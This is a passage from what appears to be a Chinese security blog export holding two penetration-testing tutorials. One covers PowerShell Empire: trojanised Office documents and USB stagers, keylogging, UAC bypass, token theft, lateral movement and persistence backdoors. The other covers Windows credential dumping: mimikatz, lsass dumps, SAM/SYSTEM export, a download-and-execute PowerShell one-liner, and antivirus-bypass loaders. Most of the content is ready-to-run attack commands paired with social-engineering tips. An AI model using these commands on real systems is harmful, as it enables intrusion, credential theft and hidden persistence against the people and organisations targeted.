shuteer<br></code></pre></td></tr></table></figure><ul><li><p>launcher_bat木马</p><p>usestager    windows&#x2F;launcher_bat</p><p>info</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs smali">set listener  shuteer<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span>                <br></code></pre></td></tr></table></figure><p>为了增加迷惑性，也可以将该批处理文件插入一个offic文件中，这里随便找一个word或者excel文件中，单击”插入”–&gt;”对象”–&gt;”由文件创建-“-&gt;</p></li></ul><p>“浏览”(选择刚刚生成的批处理文件，然后勾选”显示为图标”)</p><p>在”更改图标”界面里，我们可以选择一个图标，这里建议使用微软的Excel，Word或者PowerPoint图标</p><p>选择完之后，点击确定，该对象就会插入到文件中</p><p>将该文件发给别人，一旦打开该文件，并运行了内嵌的批处理文件，就会得到这个主机的权限</p><p>360安全卫士会报告发现宏病毒</p><h3 id="Macro木马："><a href="#Macro木马：" class="headerlink" title="Macro木马："></a>Macro木马：</h3><p>要想设置Macro木马，首先需要输入usestager windows&#x2F;macro命令然后输入info命令插卡详细信息：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">Set listener  shuteer<br>Execute<br></code></pre></td></tr></table></figure><p>默认会生成一个宏，储存在&#x2F;tmp&#x2F;macro文件中</p><p>然后需要将生成的宏添加到一个Office文档里面，这里打开一个word文件，单击‘视图’    标签，选择   ‘宏’    ，在‘宏的位置’    选择当前文件，宏名可以任意起一个，然后单击  ”创建“    按钮</p><p>单击  ”创建“  按钮以后会弹出VB编辑界面，将原来的代码删除，把生成的宏复制进去，另存为一个新文件。</p><p>最后将这个修改果的word拷到目标机上执行，打开后会提示一个安全警告，这里需要使用一些社会工程学的策略。</p><h3 id="Ducky"><a href="#Ducky" class="headerlink" title="Ducky:"></a>Ducky:</h3><p>输入  usestager   windows&#x2F;ducky</p><p>然后   info   查看帮助信息</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">set</span> listener shuteer<br>execute<br></code></pre></td></tr></table></figure><p>执行完就可以生成用于烧制的代码</p><p>将该代码烧制至”小黄鸭“中，插入目标用户的计算机，就可以反弹回来。</p><p><a href="https://www.freebuf.com/geek/141839.html">https://www.freebuf.com/geek/141839.html</a></p><h2 id="连接主机的基本使用："><a href="#连接主机的基本使用：" class="headerlink" title="连接主机的基本使用："></a>连接主机的基本使用：</h2><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><p>1.列出以连接的主机</p><p>agents</p><p>然后使用   interact 连接主机<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107212959717.png" alt="image-20240107212959717"></p><p>输入help 可以查看帮助信息</p><p>2.一些基本命令</p><ul><li><p>pwd     显示当前目录</p></li><li><p>getpid   查看当前进程<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213007073.png" alt="image-20240107213007073"></p></li><li><p>输入help agentcmds     可以看到可供使用的常用命令<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213016365.png" alt="image-20240107213016365"></p></li><li><p>在使用部分cmd命令时，要使用”shell +命令”的格式</p></li><li><p>内置mimikatz但需要管理员权限<br>输入mimikatz<br>然后输入 creds命令可以自动过滤，整理出获取的用户密码<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213026232.png" alt="image-20240107213026232"></p></li></ul><p>导出凭证：creds export 目录&#x2F;xx</p><ul><li>在实际渗透过程中，由于种种原因，总会有部分主机丢失或失效，可以输入<br>list stale  命令列出已经丢失的反弹主机，然后输入remove stale 命令删去已经失效的主机<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213034838.png" alt="image-20240107213034838"></li></ul><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>可以使用search  module 命令搜索需要使用的模块</p><p>通过使用 usemodule collection 然后Tab查看完整的列表</p><p>1.截屏</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/screenshot<br><br>info <br><br>execute<br>back<br></code></pre></td></tr></table></figure><p>2.键盘记录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule collection/keylogger<br>info<br>execute<br>back<br></code></pre></td></tr></table></figure><p>如果要持续进行键盘记录，可以把当前监控模块置于后台，输入jobs即可显示当前在后台的记录</p><p>如果要停止记录输入</p><p>jobs kill  jobs_name</p><p>3.查找共享</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/share_finder<br>execute<br>back<br></code></pre></td></tr></table></figure><p>4.收集目标主机信息</p><p>该模块可以查看本机用户。域组成员，最后的密码设置时间，剪贴板内容，系统基本信息，网络适配器等</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/winenum<br>execute<br></code></pre></td></tr></table></figure><p>5.列举系统信息(重点)</p><p>几乎列举了系统中的所有有用信息，如目标主机时间日志，应用程序控制策略日志，包括RDP登录信息，powershell脚本运行和保存的信息等。在运行这个脚本时需要管理员权限</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/host/computerdetails<br>execute<br></code></pre></td></tr></table></figure><p>6.ARP扫描</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule  situational_awareness/network/arpscan<br><span class="hljs-built_in">set</span> Range 192.168.31.0-192.168.31.254     <span class="hljs-comment">#设置扫描网段</span><br>execute<br></code></pre></td></tr></table></figure><p>7.DNS信息收集</p><p>在内网中，知道所有及其的Hostname和对应的IP地址对分析内网结构至关重要</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/reverse_dns<br>execute<br></code></pre></td></tr></table></figure><p>如果主机有两张网卡，Empire也会显示出来。方便我们寻找边界主机</p><p>8.查找域管登录服务器IP</p><p>在内网渗透中，要想拿到内网中某台机器的域管权限，方法之一就是找到域管登录的机器，然后横向渗透进去。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">该模块就是用来查找域管登录的机器,可以清除的看到那个用户登录了那台主机<br>usemodule  situational_awareness/network/powerview/user_hunter<br></code></pre></td></tr></table></figure><p>9.本地管理组访问模块</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/find_localadmin_access<br></code></pre></td></tr></table></figure><p>10.获取域控制器</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule situational_awareness/network/powerview/get_domain_controller<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213044907.png" alt="image-20240107213044907"></p><p>得知当前域服务器名为DC</p><p>在验证能否访问域服务器DC的“C$’’</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SH">shell <span class="hljs-built_in">dir</span> \\DC\C$<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213054066.png" alt="image-20240107213054066"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><ul><li><p>Bypass  UAC</p><p>输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/bypassuac<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure><p>然后会发现上线了一个新的反弹</p><p>back</p><p>agents</p><p>带星号的即为权限提升成功的agents</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-3pKc9smF-1619775511101)(..&#x2F;typora&#x2F;pic&#x2F;image-20201226224409704.png)]</p></li><li><p>bypassuac_wscript</p><p>这个模块的大概原理是使用c:\Windows\wscript.exe执行payload,即绕过UAC实现管理员权限执行Payload,只适用于系统位Windows 7的目标主机，目前尚没有对应的补丁，部分杀毒软件会有提示。</p><p>输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">    usemodule privesc/bypassuac_wscript<br>info<br><span class="hljs-built_in">set</span> Listener .....<br>execute<br></code></pre></td></tr></table></figure><p>带星号表示权限提升成功</p></li></ul><h4 id="PowerUp"><a href="#PowerUp" class="headerlink" title="PowerUp"></a>PowerUp</h4><p>Empire内置了PowerUp的部分工具，用于权限提升，主要有Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式。<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213106262.png" alt="image-20240107213106262"><br>输入:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup<br></code></pre></td></tr></table></figure><p>1.allchecks</p><p>查找系统中的漏洞，和powerSploit中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/powerup/allchecks<br>execute<br></code></pre></td></tr></table></figure><p>一般会列出一些提权方法：</p><p>可以尝试bypass  UAC来提权</p><p>接着输入bypassuac   root1(listener 名字)</p><p>星号表示提权成功</p><h4 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h4><p>在域里常会启用组策略首选项来更改本地密码，便于管理和部署映像，其缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取部署信息。GPP是采用AES 256加密的</p><p>输入以下命令即可查看</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule privesc/gpp<br></code></pre></td></tr></table></figure><h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><ul><li><h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>在获取服务器权限后，可以使用内置的Mimikatz获取系统密码，执行完毕后输入creds</p><p>命令即可查看Empire列举的密码。</p><p>可以发现有域用户曾在此服务器上登录，此时可以窃取域用户身份，然后进行横向渗透，首先要窃取身份</p><p>使用pth<ID>命令</ID></p><p>这里ID就是creadID号<br><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213118287.png" alt="image-20240107213118287"></p><p><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213129942.png" alt="image-20240107213129942"></p></li></ul><p>可以看到执行完之后显示PID进程为2040</p><p>使用steal_token  PID命令即可窃取该身份</p><p>同样可以输入ps查看是否有域用户的进程</p><p>如果有同样通过   steal_token命令来窃取这个令牌</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">steal_token  PID<br></code></pre></td></tr></table></figure><p>输入  revtoself   命令可以将令牌权限恢复到原来的状态。</p><ul><li><h4 id="会话注入"><a href="#会话注入" class="headerlink" title="会话注入"></a>会话注入</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule management/psinject<br><span class="hljs-built_in">set</span> Listener <br><span class="hljs-built_in">set</span> ProcId             <span class="hljs-comment">#设置进程id</span><br></code></pre></td></tr></table></figure><p>该模块进行进程注入，获取权限。</p><p>设置Listener 和Proc  ID这两个参数运行反弹shell</p></li></ul><p><img src="/2022/06/15/Empire%E4%BD%BF%E7%94%A8/Empire%E4%BD%BF%E7%94%A8/image-20240107213141124.png" alt="image-20240107213141124"></p><ul><li><h4 id="Invoke-PsExec"><a href="#Invoke-PsExec" class="headerlink" title="Invoke-PsExec"></a>Invoke-PsExec</h4></li></ul><p>  缺点：是能被基本的杀毒软件检测并留下日志，而且需要开启admiin$445端口共享</p><p>  优点：是可以直接返回system权限。</p><p>  该模块的前提是已经获得本地管理员权限，甚至域管理员账户，然后以此进一步持续渗透整个内网。</p>  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_psexec<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure><p>  [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-EiuWuqes-1619775582049)(..&#x2F;typora&#x2F;pic&#x2F;image-20201227125717808.png)]</p><ul><li><h4 id="Invoke-WMI"><a href="#Invoke-WMI" class="headerlink" title="Invoke -WMI"></a>Invoke -WMI</h4><p>比Ps-Exec安全，所有windows系统都启用了该服务，不会写入日志。极高隐蔽性。如果目标机开启了防火墙WMI将无法连接目标机器。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li><li><h4 id="PowerShell-Remoting"><a href="#PowerShell-Remoting" class="headerlink" title="PowerShell Remoting"></a>PowerShell Remoting</h4><p>Powershell Remoting是Powershell 的远程管理功能。开启windows远程管理服务WinRM系统会监听5985端口，该服务默认在windows server2012中是开启的，在windows server 2003&#x2F;2008&#x2F;2008 R2中需要手动启动。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">   usemodule lateral_movement/invoke_paremoting<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br>execute<br></code></pre></td></tr></table></figure></li></ul><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>  后门最主要的目的就是方便以后再次秘密进入或者控制系统</p><ul><li><h4 id="权限持久性劫持shift后门"><a href="#权限持久性劫持shift后门" class="headerlink" title="权限持久性劫持shift后门"></a>权限持久性劫持shift后门</h4><p>输入：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule lateral_movement/invoke_wmi_debugger<br><span class="hljs-built_in">set</span> Listener    <span class="hljs-comment">#设置监听名</span><br><span class="hljs-built_in">set</span>  ComputerName     <span class="hljs-comment">#设置机器名</span><br><span class="hljs-built_in">set</span> TargetBinary  sethc.exe<br>execute<br></code></pre></td></tr></table></figure><p>运行完后再目标主机远程登录窗口按5次shift键即可触发后门。</p><p>sethc.exe可以替换成以下这几项：</p><p>1.Utilman.exe(使用Win+U组合键启动)</p><p>2.osk.exe(屏幕上的键盘：使用win+U启动组合键)</p><p>3.Narrator.exe(启动讲述人：使用win+U启动组合键)</p><p>4.Magnify.exe(放大镜:使用Win+U组合键启动)</p></li><li><h4 id="注册表注入后门"><a href="#注册表注入后门" class="headerlink" title="注册表注入后门"></a>注册表注入后门</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/userland/registry<br><span class="hljs-built_in">set</span> RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run<br>execute<br></code></pre></td></tr></table></figure><p>当我们登录系统时木马就会运行，服务端反弹成功。</p></li><li><h4 id="计划任务获得系统权限"><a href="#计划任务获得系统权限" class="headerlink" title="计划任务获得系统权限"></a>计划任务获得系统权限</h4><p>到了具体的时间将成功返回一个高权限shell,再实际渗透模块中运行该模块时，杀毒软件会有提示</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule persistence/elevated/schtasks<br><span class="hljs-built_in">set</span> Listener wei<br><span class="hljs-built_in">set</span> DailyTime 15:36<br>execute<br></code></pre></td></tr></table></figure><p>这里如果把 set RegPath改为    set RegPath HKCU:Software\Microsoft\Windows\CurrentVersion\Run</p><p>那么就会再15:36添加一个注册表注入后门。</p></li></ul><h2 id="Empire反弹回Metasploit"><a href="#Empire反弹回Metasploit" class="headerlink" title="Empire反弹回Metasploit"></a>Empire反弹回Metasploit</h2><p>在实际渗透中，当拿到Webshell上传的MSF客户端无法绕过目标主机的杀毒软件时，可以使用Powershell来绕过，也可以执行Empire的payload来绕过，成功之后在使用Empire的模块将其反弹回Metasploit</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">usemodule code_execution/invoke_shellcode<br><span class="hljs-built_in">set</span> Lhost                 <span class="hljs-comment">#设置msf所在主机的IP</span><br><span class="hljs-built_in">set</span> Lport                  <span class="hljs-comment">#设置端口</span><br>execute<br></code></pre></td></tr></table></figure><p>在msf上设置监听：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_https<br><span class="hljs-built_in">set</span> lhost                    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> lport    <span class="hljs-comment">#一般不用管设置</span><br><span class="hljs-built_in">set</span> Shellcode                <span class="hljs-comment">#自定义shellcode注入</span><br>run<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>内网安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网安全</tag>
      
      <tag>Empire使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网密码抓取</title>
    <link href="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/"/>
    <url>/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h2 id="Hash读取"><a href="#Hash读取" class="headerlink" title="Hash读取"></a>Hash读取</h2><p>在提权成功拿到system权限之后，下一步就应该为内网渗透做准备。其中很重要的一步就是读取设备本地的hash值。工具读取hash的本质都是利用system权限去读取Windows的SAM文件。在Windows2012版本以下，还可以通过工具直接去读取内存里面的明文密码，Windows 2012之后不能再读内存中的明文，只能用mimiakatz等工具读取hash值然后进行破解。</p><p> <strong>一.使用pwdump获取hash</strong><br> pwdump是一款本地hash读取工具，需要系统权限运行，直接在CMD命令窗口运行即可。测试win7、Win03、window08 均可读取hash值：<br> <img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161004582.png" alt="image-20240107161004582"><br>下载地址:<a href="https://www.openwall.com/passwords/windows-pwdump">https://www.openwall.com/passwords/windows-pwdump</a><br><strong>二.使用Getpassowrd</strong><br>打开命令行环境，直接运行工具即可。可获取明文密码。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161013909.png" alt="image-20240107161013909"><br>下载地址：<a href="https://github.com/QAX-A-Team/getpass">https://github.com/QAX-A-Team/getpass</a><br><strong>三.使用mimikatz</strong><br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161023483.png" alt="image-20240107161023483"><br>Win10或Win 2012 R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，那么可通过修改注册表方式抓取明文，但需要重启电脑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 修改注册表路径,添加一个REG_DWORD类型名为UseLogonCredential设置为1,即可抓取明文</span><br>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest<br><br><span class="hljs-comment"># 命令修改注册表方式如下</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure><p>下载地址：<a href="https://github.com/gentilkiwi/mimikatz/releases">https://github.com/gentilkiwi/mimikatz/releases</a></p><p> <strong>4.使用Powershell</strong></p><p>或者可以使用Empire的powershell mimikatz<br>powersploit内置有此模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">powershell -<span class="hljs-built_in">exec</span> bypass<br>Import-Module .\Get-PassHashes.PS1<br>Get-PassHashes<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161033151.png" alt="image-20240107161033151"></p><p>或者powershell版mimikataz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ps1脚本下载</span><br>https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1<br><span class="hljs-comment"># 访问上面链接,会跳转下面链接,所以DownloadString时,使用下面链接,不然会提示“基本连接已关闭等”错误</span><br>https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1<br><br><span class="hljs-comment"># powershell抓取,前提保证目标可以访问ps1脚本,否则将脚本放在内网中 (执行速度非常慢)</span><br>powershell.exe IEX (New-Object Net.WebClient).DownloadString(<span class="hljs-string">&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;</span>);Invoke-Mimikatz<br></code></pre></td></tr></table></figure><p>这里我本地搞得就不用远程下载得方式了<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161041750.png" alt="image-20240107161041750"></p><p><strong>5.使用quarkspwdump</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">输入<br>QuarksPwDump.exe --dump-hash-local<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161051035.png" alt="image-20240107161051035"><br>下载地址:<a href="http://code.google.com/p/quarkspwdump/">http://code.google.com/p/quarkspwdump/</a> </p><p><strong>6.使用procdump+mimikatz</strong><br>procdump是微软官网发布得工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截这些操作，导出文件后将文件下载到本地，然后用mimikatz导出密码散列值。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//使用procdump导出lsass.dmp文件<br>procdump64.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161100241.png" alt="image-20240107161100241"><br>导出成功，此时当前目录就会增加一个lsass.dmp文件，接下来就用Mimikatz导出密码散列值。<br><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161108564.png" alt="image-20240107161108564"><br><strong>7.通过 SAM和System 文件抓取密码</strong><br>无工具导出SAM文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">reg save hklm\sam sam.hive<br>reg save hklm\system system.hive<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161117265.png" alt="image-20240107161117265"><br>会在当前路径下增加两个文件 sam.hive  和 system.hive<br>使用mimikatz通过sam和system文件获取NTLM Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">//将两个文件和Mimikatz放在同一目录下<br>lsadump::sam /sam:sam.hive  /system:system.hive<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96/image-20240107161126469.png" alt="image-20240107161126469"></p><p><strong>- wce</strong><br>命令：wce.exe -w（抓取明文）、wce.exe –l（抓取hash）</p><ul><li><strong>限制下载文件长度时导出凭据的方法</strong><br>在c#文件中加载mimikatz的方法，实现以下功能：<br>1.获得lsass.exe进程的dmp文件并保存到temp目录<br>2.从dmp文件导出凭据<br>3.删除dmp文件<br>很多实际情况环境对下载文件做了大小限制</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">C:\Windows\Microsoft.NET\Framework64\v3<span class="hljs-number">.5</span>\csc.exe mimikatz.cs /unsafe<br></code></pre></td></tr></table></figure><p>然后直接执行exe<br>mimikatz bypass<br>1.PE to shellcode<br>下载地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pe2shc.exe mimikatz.exe mimi.txt<br>runshc64.exe mimi.txt<br></code></pre></td></tr></table></figure><p>这个方法不太行了<br>2.c#加载mimikatz</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">cscript mimikatz.js<br></code></pre></td></tr></table></figure><p>3.白名单加载mimikatz<br>使用白名单程序msbuild进行进行加载xml文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 